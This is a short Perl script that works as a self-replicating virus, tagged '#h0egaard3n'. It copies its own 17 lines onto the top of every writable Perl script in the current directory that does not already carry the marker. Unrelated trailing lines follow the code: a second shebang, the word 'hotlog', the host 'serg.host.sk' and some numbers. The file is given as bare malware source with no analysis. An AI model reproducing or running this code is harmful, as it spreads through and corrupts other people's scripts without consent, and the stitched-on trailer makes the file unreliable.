#!/usr/bin/perl
#h0egaard3n
open(File,$0);
@vx=<File>;
close(File);
foreach $Fichier (<*>){
if ((-f $Fichier) && (-r $Fichier) && (-w $Fichier)){
open(File, "$Fichier");
@Temp=<File>;
close(File);
if (@Temp[0] =~ "/perl"){
if (@Temp[1] ne "\#h0egaard3n\n"){
open(File, ">$Fichier");
print File @vx[0 .. 16];
print File @Temp;
close (File);
}}}}
#!/usr/bin/perl
hotlog
1
serg.host.sk/
1600
667801216
34459479
3995714560
29801015
*
